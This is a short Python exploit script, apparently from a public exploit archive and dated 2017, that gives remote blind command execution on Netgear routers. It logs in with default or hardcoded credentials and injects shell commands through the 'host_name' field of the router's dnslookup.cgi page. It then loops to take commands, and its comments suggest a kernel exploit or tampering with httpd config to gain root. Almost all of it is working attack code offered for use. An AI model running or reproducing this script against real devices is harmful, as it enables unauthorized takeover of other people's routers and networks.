 
#Provides access to default user account, privileges can be easily elevated by using either:
# - a kernel exploit (ex. memodipper was tested and it worked)
# - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon)
  
#Pozdrawiam: Kornela, Komara i Sknerusa
 
import sys
import requests
  
#You can change these credentials to ex. Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions
#These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to
  
login = &#039;admin&#039;
password = &#039;password&#039;
  
def main():
    if len(sys.argv) < 2:
        print "./netgearpwn_2.py <router ip>"
        return
    spawnShell()
 
def execute(cmd): #Escaping basic sanitization
    requests.post("http://" + sys.argv[1] + "/dnslookup.cgi", data={&#039;host_name&#039;:"www.google.com; " + cmd, &#039;lookup&#039;: "Lookup"}, auth=(login, password))
    return
 
def spawnShell():
    print "Dropping a shell-like environment (blind OS injection)"
    print "To test it type &#039;reboot&#039;"
    while True:
        cmd = raw_input("[blind $] ")
        execute(cmd)
  
if __name__ == "__main__":
    main()
 
#2017-02-25 by SivertPL
#Tak, to ja.

